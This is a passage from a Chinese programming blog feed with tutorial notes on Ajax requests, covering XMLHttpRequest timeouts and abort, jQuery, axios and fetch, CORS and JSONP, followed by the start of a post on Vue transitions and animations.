response.send(str);<br>&#125;);<br></code></pre></td></tr></table></figure><p>而在接收方，我们就需要解析response的数据，这里就有两种方法：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-comment">//方案一：手动转换</span><br><span class="hljs-keyword">if</span> (xhr.status &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.status &lt; <span class="hljs-number">300</span>) &#123;<br>     <span class="hljs-comment">//使用手动转换</span><br>        <span class="hljs-keyword">let</span> <span class="hljs-built_in">data</span> = JSON.parse(xhr.response)<br>        console.<span class="hljs-keyword">log</span>(<span class="hljs-built_in">data</span>);<span class="hljs-comment">//手动的时候里面填data</span><br>        result.innerHTML=<span class="hljs-built_in">data</span>.name;<br>&#125;<br><br><span class="hljs-comment">//方案二：自动转换</span><br><span class="hljs-comment">//设置自动转换类型-json，将response的json解析</span><br>xhr.responseType=<span class="hljs-string">&quot;json&quot;</span><br><span class="hljs-params">...</span><br><span class="hljs-keyword">if</span> (xhr.status &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.status &lt; <span class="hljs-number">300</span>) &#123;<br>console.<span class="hljs-keyword">log</span>(xhr.response);<span class="hljs-comment">//这里的response已经解析过</span><br>result.innerHTML=xhr.response.name;<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="（7）-nodemon"><a href="#（7）-nodemon" class="headerlink" title="（7）.nodemon"></a>（7）.nodemon</h3><p><code>nodemon</code> 是一个基于node 的小工具，它可以帮助我们实现<strong>不重启实行服务端的刷新</strong> ，首先确保安装了node.js</p><p>然后我们在控制台输入：<code>npm install -g nodemon</code></p><p>在我们需要运行服务端的时候输入：<code>nodemon 文件名</code></p><p>tips：我运行时报了一个错：</p><p><img src="https://s2.loli.net/2022/05/03/czu13ligoVNLURv.png" alt="nodemon报错.png"></p><p>遇到这个问题时，我们打开window的powershell，以管理员身份运行</p><p><img src="https://s2.loli.net/2022/05/03/auoGSPJXMkTF1bx.png" alt="nodemon问题解决1.png"></p><p>输入：<code>set-ExecutionPolicy RemoteSigned</code>，再重新运行一下我们的nodemon就可以了</p><h3 id="（8）-断网和超时响应"><a href="#（8）-断网和超时响应" class="headerlink" title="（8）.断网和超时响应"></a>（8）.断网和超时响应</h3><p>在我们网络不好或者没有网的时候需要得到页面的反馈，而这些就是ajax中的超时反馈</p><p>我们通过setTimeout模拟网络延迟：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">app.all(<span class="hljs-string">&#x27;/delay&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(request, response)</span> =&gt;</span> &#123;<br>    <span class="hljs-regexp">//</span>设置响应头，设置允许跨域<br>    response.setHeader(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>);<br>    <span class="hljs-regexp">//</span>设置响应<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>        response.send(<span class="hljs-string">&#x27;hello AJAX&#x27;</span>);<br>    &#125;, <span class="hljs-number">3000</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>设置三秒的延迟</p><p>在前端页面上，我们要求在两秒以上便不再等待，直接报错提示</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">xhr.<span class="hljs-attribute">timeout</span>=2000;<br>xhr.<span class="hljs-attribute">ontimeout</span>=function()&#123;<br>alert(<span class="hljs-string">&quot;网络异常，链接失败&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>ontimeout会在timeout的时间之后，<strong>执行函数回调，并取消这个请求</strong></p><p>我们接下来模拟断网，在network选项下选择offline</p><p>前端页面中加入：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">xhr.onerror</span>=<span class="hljs-function"><span class="hljs-title">function</span>()&#123;</span><br><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&quot;网络已断开&quot;</span>)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在断网条件下，发出警示。</p><h3 id="（9）-取消发送请求"><a href="#（9）-取消发送请求" class="headerlink" title="（9）.取消发送请求"></a>（9）.取消发送请求</h3><p>在我们需要使用<code>ajax</code>手动取消请求发送的时候，我们可以使用<code>ajax</code>对象上的abort()方法</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scilab">btn2.onclick = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>&#123;</span><br>            xhr.<span class="hljs-keyword">abort</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是：<strong>要把xhr的定义放在外层，而且需要定义成let</strong> ，不然会因为变量域的问题报错。</p><h3 id="（10）-重复发送问题"><a href="#（10）-重复发送问题" class="headerlink" title="（10）.重复发送问题"></a>（10）.重复发送问题</h3><p>在遇到一个用户多次或者多个用户同时发送超多请求的情况下。我们需要一种机制使得我们的服务端压力减少。</p><p>这里采用的是标志变量的解决办法，比较暴力：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> btn1 = <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&quot;#btn1&quot;</span>);<br>        <span class="hljs-comment">//标志变量</span><br>        <span class="hljs-keyword">let</span> isSending=<span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">let</span> xhr=<span class="hljs-literal">null</span>;<br>        btn1.onclick = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(isSending) xhr.abort();<span class="hljs-comment">//如果现在有请求，那么取消当前请求，发送一个新的请求</span><br>            xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>            isSending=<span class="hljs-literal">true</span>;<span class="hljs-comment">//表示此刻已有请求</span><br>            xhr.open(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://localhost:8000/delay&#x27;</span>);<br>            xhr.send();<br>            xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">if</span> (xhr.readyState === <span class="hljs-number">4</span>) &#123;<span class="hljs-comment">//说明返回来所有结果   </span><br>                    isSending=<span class="hljs-literal">false</span>;<span class="hljs-comment">//返回结果请求结束，重新改为false</span><br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>每次发送请求之前都判断当前是否有请求发送但未回复，如果有就取消那个请求，并发送一个新的请求。</p><h2 id="4-jQuery中的Ajax"><a href="#4-jQuery中的Ajax" class="headerlink" title="4.jQuery中的Ajax"></a>4.jQuery中的Ajax</h2><p>jQuery中通过Ajax发送请求的方式有三种，GET，POST和通用方法Ajax</p><h3 id="方式1-get"><a href="#方式1-get" class="headerlink" title="方式1  $.get()"></a>方式1  $.get()</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$(<span class="hljs-string">&#x27;button&#x27;</span>).eq(<span class="hljs-number">0</span>).click(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>            $.get(<span class="hljs-string">&#x27;http://localhost:8000/jQuery-server&#x27;</span>,&#123;<span class="hljs-attr">a</span>:<span class="hljs-number">100</span>&#125;,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;<br>                <span class="hljs-built_in">console</span>.log(data);<br>            &#125;,<span class="hljs-string">&#x27;json&#x27;</span>)<span class="hljs-comment">//末尾可以传入参数，表示传输的数据类型</span><br>        &#125;)<br></code></pre></td></tr></table></figure><p>和我们一般的get请求差异不大，只是写成了偏函数的形式。get中的参数(url，传参，回调，response解析格式)</p><h3 id="方式2-post"><a href="#方式2-post" class="headerlink" title="方式2  $.post()"></a>方式2  $.post()</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$(<span class="hljs-string">&#x27;button&#x27;</span>).eq(<span class="hljs-number">1</span>).click(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>            $.post(<span class="hljs-string">&#x27;http://localhost:8000/jQuery-server&#x27;</span>,&#123;<span class="hljs-attr">a</span>:<span class="hljs-number">100</span>&#125;,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;<br>                <span class="hljs-built_in">console</span>.log(data);<br>            &#125;)<br>        &#125;) <br></code></pre></td></tr></table></figure><p>和get()类似，也是四个参数</p><h3 id="方式3-ajax"><a href="#方式3-ajax" class="headerlink" title="方式3 $.ajax()"></a>方式3 $.ajax()</h3><p>这个使用与前面两个相比要复杂一点</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs awk">$(<span class="hljs-string">&#x27;button&#x27;</span>).eq(<span class="hljs-number">2</span>).click(<span class="hljs-keyword">function</span>()&#123;<br>           $.ajax(&#123;<br>               <span class="hljs-regexp">//u</span>rl地址<br>               url:<span class="hljs-string">&#x27;http://localhost:8000/jQuery-server&#x27;</span>,<br>               <span class="hljs-regexp">//</span>传入的参数<br>               data:&#123;a:<span class="hljs-number">100</span>,b:<span class="hljs-number">200</span>&#125;,<br>               <span class="hljs-regexp">//</span>请求类型<br>               type:<span class="hljs-string">&#x27;GET&#x27;</span>,<br>               <span class="hljs-regexp">//</span>返回数据类型<br>               dataType:<span class="hljs-string">&#x27;json&#x27;</span>,<br>               <span class="hljs-regexp">//</span>成功的回调<br>               success:<span class="hljs-keyword">function</span>(data)&#123;<br>                   console.log(data);<br>               &#125;,<br>               <span class="hljs-regexp">//</span>时间限制<br>               timeout:<span class="hljs-number">2000</span>,<br>               <span class="hljs-regexp">//</span>失败回调<br>               error:<span class="hljs-keyword">function</span>()&#123;<br>                   console.log(<span class="hljs-string">&quot;出错了&quot;</span>);<br>               &#125;,<br>               <span class="hljs-regexp">//</span>自定义头信息<br>            <span class="hljs-regexp">//</span>    headers:&#123;<br>            <span class="hljs-regexp">//</span>    &#125;<br>           &#125;)<br>        &#125;) <br></code></pre></td></tr></table></figure><p>需要配置的参数都以对象的形式写了出来，这里是一些常用的参数，还有一些其他的参数，可以在jQuery官网上参看。</p><h2 id="5-promise中的Ajax"><a href="#5-promise中的Ajax" class="headerlink" title="5.promise中的Ajax"></a>5.promise中的Ajax</h2><p>首先我们引入<code>axios</code>:</p><p>1.我们在GitHub上面引入 –》<a href="https://github.com/axios/axios">https://github.com/axios/axios</a></p><p>2.如果觉得GitHub太慢，我们可以在bootcdn上引入 –》<a href="https://www.bootcdn.cn/axios/">https://www.bootcdn.cn/axios/</a></p><p>在我们的代码中引入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/axios/0.26.1/axios.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>crossorigin=&quot;anonymous&quot;</code>是为了防止跨源报错，<strong>开启允许跨域访问</strong></p><h3 id="方式1-axios-get"><a href="#方式1-axios-get" class="headerlink" title="方式1 axios.get()"></a>方式1 axios.get()</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs arcade">btns[<span class="hljs-number">0</span>].onclick = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>            axios.get(<span class="hljs-string">&#x27;/axios-server&#x27;</span>, &#123;<br>                <span class="hljs-comment">//url参数</span><br>                params: &#123;<br>                    <span class="hljs-attr">a</span>: <span class="hljs-number">100</span>,<br>                    <span class="hljs-attr">b</span>: <span class="hljs-number">200</span><br>                &#125;,<br>                <span class="hljs-comment">//请求头信息</span><br>                headers: &#123;<br>                    <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;lol&quot;</span><br>                &#125;,<br>            &#125;).then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>                console.log(value);<br>            &#125;);<br>        &#125;<br></code></pre></td></tr></table></figure><p>因为axios基于promise，所以这里是通过promise的方法then()，产生回调。</p><h3 id="方式2-axios-post"><a href="#方式2-axios-post" class="headerlink" title="方式2 axios.post()"></a>方式2 axios.post()</h3><p>post多出一个请求体内容：需要写在第二个参数，其他配置就挪到了第三个参数</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">btns[<span class="hljs-number">1</span>].onclick = <span class="hljs-keyword">function</span> () &#123;<br>            axios.post(<span class="hljs-string">&#x27;/axios-server&#x27;</span>, &#123;<span class="hljs-regexp">//</span>第二个参数是请求体              <br>                    username:<span class="hljs-string">&#x27;admin&#x27;</span>,<br>                    password:<span class="hljs-string">&#x27;admin&#x27;</span><br>                &#125;,&#123;<span class="hljs-regexp">//</span>第三个参数，其他数据<br>                <span class="hljs-regexp">//u</span>rl参数<br>                params: &#123;<br>                    uid: <span class="hljs-number">666</span>,<br>                    b: <span class="hljs-number">200</span><br>                &#125;,<br>                <span class="hljs-regexp">//</span>请求头信息<br>                headers: &#123;<br>                    name: <span class="hljs-string">&quot;lol&quot;</span><br>                &#125;  <br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p>然后我们就可以在<code>Request PayLoad</code>中参看我们的请求体了</p><h3 id="方式3-axios通用方法"><a href="#方式3-axios通用方法" class="headerlink" title="方式3 axios通用方法"></a>方式3 axios通用方法</h3><p>我们在开发中还有一种通用的方法发送ajax请求：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs awk">btns[<span class="hljs-number">2</span>].onclick = <span class="hljs-keyword">function</span> () &#123;<br>           axios(&#123;<br>               <span class="hljs-regexp">//</span>请求方法<br>               method: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>               <span class="hljs-regexp">//u</span>rl<br>               url:<span class="hljs-string">&#x27;/axios-server&#x27;</span>,<br>               <span class="hljs-regexp">//u</span>rl参数<br>               params:&#123;<br>                   vip:<span class="hljs-number">10</span>,<br>                   level:<span class="hljs-number">30</span><br>               &#125;,<br>               <span class="hljs-regexp">//</span>头信息<br>               headers:&#123;<br>                   a:<span class="hljs-number">100</span>,<br>                   b:<span class="hljs-number">200</span><br>               &#125;,<br>               <span class="hljs-regexp">//</span>请求体参数<br>               data:&#123;<br>                   username:<span class="hljs-string">&#x27;admin&#x27;</span>,<br>                   password:<span class="hljs-string">&#x27;admin&#x27;</span><br>               &#125;<br>           &#125;).then(response=&gt;&#123;<span class="hljs-regexp">//</span>获取响应内容<br>               console.log(response);<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p>与前面jQuery中的 $.ajax()很类似，我们需要配置的参数写在axios({})中</p><h2 id="6-fetch发送Ajax请求"><a href="#6-fetch发送Ajax请求" class="headerlink" title="6.fetch发送Ajax请求"></a>6.fetch发送Ajax请求</h2><p>fetch是基于promise的全局发送ajax的一个方法（但是实际开发中，我们还是axios用的多一点）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arcade">btn.onclick = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>            fetch(<span class="hljs-string">&#x27;http://localhost:8000/fetch-server?vip=10&#x27;</span>, &#123;<br>                <span class="hljs-comment">//请求方法</span><br>                method: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-comment">//请求头</span><br>                headers: &#123;<br>                    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;swpu&#x27;</span><br>                &#125;,<br>                <span class="hljs-comment">//请求体</span><br>                body: <span class="hljs-string">&#x27;username=admin &amp; password=admin&#x27;</span><br>            &#125;).then(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>                <span class="hljs-keyword">return</span> response.text();<span class="hljs-comment">//如果是json格式，就response.json()</span><br>            &#125;).then(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>                console.log(response);<br>            &#125;).catch(<span class="hljs-function"><span class="hljs-params">err</span>=&gt;</span>&#123;<br>                console.log(err);<br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="7-跨域"><a href="#7-跨域" class="headerlink" title="7.跨域"></a>7.跨域</h2><h3 id="1-同源策略"><a href="#1-同源策略" class="headerlink" title="1.同源策略"></a>1.同源策略</h3><p>定义：协议，域名，端口号必须完全相同，页面和请求向同一个源请求</p><p>ajax默认遵从同源策略，不是同源策略无法直接发ajax请求</p><p>而如果我们违背了同源策略，那么我们就跨域了（3000端口向8000发请求，http向https发请求）</p><p>满足同源策略：url可以简写=》与页面相同的部分url都可以不写</p><h3 id="2-JSONP"><a href="#2-JSONP" class="headerlink" title="2.JSONP"></a>2.JSONP</h3><p>非官方的跨域解决方法，（也就是靠码农们的聪明才智），只支持get请求，是借助一些可以跨域的html标签（img,link…）实现的</p><p>比如我们的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/axios/0.26.1/axios.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>便是通过scipt标签跨源引入了我们的文件。</p><p>但是对于我们的script标签，如果收到的返回是字符串之类的便会报错，<strong>因为js引擎只能识别js代码，所以我们需要服务端给我们返回js代码。</strong>一般可以返回函数调用，然后交给前端代码进行处理。</p><h3 id="3-CORS"><a href="#3-CORS" class="headerlink" title="3.CORS"></a>3.CORS</h3><p>于是我们迎来了正规的跨域解决方法–CORS，发跨域的问题交给了服务端</p><p>原理是通过设置一个响应头告诉浏览器实现跨域</p><p>这个响应头也就是我们之前使用的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">response.setHeader(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>);<span class="hljs-regexp">//</span><span class="hljs-string">&#x27;*&#x27;</span>里面可以添加那些网页可以给我发请求，*是全部<br></code></pre></td></tr></table></figure><p>世界线收束！！！</p>]]></content>
    
    
    <categories>
      
      <category>Ajax</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ajax</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动画与过渡</title>
    <link href="/2022/04/17/%E5%8A%A8%E7%94%BB%E5%92%8C%E8%BF%87%E6%B8%A1/"/>
    <url>/2022/04/17/%E5%8A%A8%E7%94%BB%E5%92%8C%E8%BF%87%E6%B8%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="动画和过渡"><a href="#动画和过渡" class="headerlink" title="动画和过渡"></a>动画和过渡</h1><h2 id="1-一个简单的动画"><a href="#1-一个简单的动画" class="headerlink" title="1.一个简单的动画"></a>1.一个简单的动画</h2><p>我们现在使用<code>vue</code>写一个简单的动画，首先我们需要写出动画的css样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* v本来应该是transition的名字，没有默认为v */</span><br><span class="hljs-selector-class">.hello-enter-active</span>&#123;<br>    <span class="hljs-attribute">animation</span>: showh1 <span class="hljs-number">0.5s</span> linear;<br>&#125;<br><br><span class="hljs-selector-class">.hello-leave-active</span>&#123;<br>    <span class="hljs-attribute">animation</span>: showh1 <span class="hljs-number">0.5s</span> linear reverse;<br>&#125;<br>//keyframes 是动画帧，代表下面是动画<br><span class="hljs-keyword">@keyframes</span> showh1&#123;<br>    <span class="hljs-selector-tag">from</span>&#123;<br>        <span class="hljs-attribute">transform</span>:<span class="hljs-built_in">translateX</span>(-<span class="hljs-number">100%</span>);<br>    &#125;<br>    <span class="hljs-selector-tag">to</span>&#123;<br>        <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0px</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>enter 和leave分别是进场和退场动画，退场动画使用了reverse也就是进场动画的倒放，linear表示匀速播放。</p><p>接下来我们用一个新标签<code>&lt;transition&gt;</code>，这个标签用于包裹我们要添加动画的部分</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">transition</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">:appear</span>=<span class="hljs-string">true</span>&gt;</span><span class="hljs-comment">&lt;!-- 直接写appear也可以 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span>&gt;</span>你好啊！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">transition</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个name属性便是上面.hello-enter和.hello-leave中hello的由来，不写的时候就会默认.v-enter，:appear实现刷新的时候也能加载动画</p><p>需要注意一下我们这里的动画是在<code>isShow</code>属性改变之后触发的，<strong>也就是<code>isShow</code>改变为false之后不会立即消失，而是执行完动画之后再消失。</strong></p><h2 id="2-一个简单的过渡"><a href="#2-一个简单的过渡" class="headerlink" title="2.一个简单的过渡"></a>2.一个简单的过渡</h2><p>我们现在使用过渡完成上面动画的效果</p><p>主要是css部分的改变</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.hello-enter-active</span>,<span class="hljs-selector-class">.hello-enter-active</span>&#123;<br> <span class="hljs-attribute">animation</span>: <span class="hljs-number">0.5s</span> linear;<br>&#125;<br><span class="hljs-comment">/* 进入的起点和离开的终点 */</span><br><span class="hljs-selector-class">.hello-enter</span>,<span class="hljs-selector-class">.hello-leave-to</span>&#123;<br>    <span class="hljs-attribute">transform</span>:<span class="hljs-built_in">translateX</span>(-<span class="hljs-number">100%</span>) ;<br>&#125;<br><span class="hljs-comment">/* 进入的终点和离开的起点 */</span><br><span class="hljs-selector-class">.hello-enter-to</span>,<span class="hljs-selector-class">.hello-leave</span>&#123;<br>    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0px</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们不使用动画帧就，通过加入 进入和离开的终点和起点实现效果</p><h2 id="3-多个元素的过渡"><a href="#3-多个元素的过渡" class="headerlink" title="3.多个元素的过渡"></a>3.多个元素的过渡</h2><p>当我们的多个元素都需要过渡的时候，我们就需要在这些元素外面换一个包裹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">transition-group</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">:appear</span>=<span class="hljs-string">true</span>&gt;</span><span class="hljs-comment">&lt;!-- 直接写appear也可以 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>你好啊！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>World<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">transition-group</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;transition-group&gt;</code>就帮助我们实现了多个元素的过渡，需要注意的是，因为我们group中的是一个list，<strong>我们要在每个元素里面加<code>key</code>值</strong></p><h2 id="4-集成第三方的动画库"><a href="#4-集成第三方的动画库" class="headerlink" title="4.集成第三方的动画库"></a>4.集成第三方的动画库</h2><p>在实现我们动画的时候，我们可以导入第三方的库帮助我们开发，这里我们使用<code>npm</code>上面的animate库</p><p>这里是链接 &lt;<a href="https://animate.style/">Animate.css | A cross-browser library of CSS animations.</a>&gt;</p><p>首先安装这个库：在控制台输入<code>npm install animate.css</code></p><p>引入这个库：<code>import &quot;animate.css&quot;; //因为是一个库，直接引用就好了</code></p><p>接下来我们就上代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 